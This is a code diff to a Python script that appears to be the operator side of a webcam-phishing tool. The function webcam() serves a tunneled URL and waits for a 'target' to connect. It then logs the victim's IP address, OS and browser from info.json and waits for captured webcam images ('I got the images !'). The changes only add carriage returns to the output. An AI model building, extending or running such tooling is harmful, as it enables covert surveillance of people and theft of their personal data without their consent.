@@ -84,7 +84,7 @@ def webcam():
     print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , ").lstrip())
     linecache.clearcache()
 
-    Sprint(Fore.YELLOW + "waiting for target to connect...\n".lstrip() + Fore.RESET)
+    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".lstrip() + Fore.RESET)
 
 #Write info====================================================================================================
     try:
@@ -96,9 +96,9 @@ def webcam():
                 with open("info.json", "r") as read_file:
                     data = json.load(read_file)
                     
-                    print(Fore.CYAN + "\nTarget Ip :" , data["dev"][0]["Os-Ip"  ])
-                    print("\nOs Name :" , data["dev"][0]["Os-Name"])
-                    print("\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
+                    print(Fore.CYAN + "\r\nTarget Ip :" , data["dev"][0]["Os-Ip"  ])
+                    print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
+                    print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                     
                     sleep(1)
                     df = pd.read_json(r"info.json")
@@ -111,18 +111,18 @@ def webcam():
                     open("info.json" , "w").close()
                     victim_file.close()
 
-                    Sprint(Fore.YELLOW + "\nWaiting for images...".title() + Fore.RESET)
+                    Sprint(Fore.YELLOW + "\r\nWaiting for images...".title() + Fore.RESET)
                     break
 
     except KeyboardInterrupt:
-        exit(f"\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
+        exit(f"\r\n{Fore.RED}[-]{Fore.BLUE} User Exited :)")
 
 #====================================================================================================
    
     while True:
         folder = sum([f.stat().st_size for f in Path("../images").glob("**/*")])
         if folder != 0:
-           print(Fore.GREEN + "\n\nI got the images !".title() + Fore.RESET)
+           print(Fore.GREEN + "\r\n\nI got the images !".title() + Fore.RESET)
 
            break
 
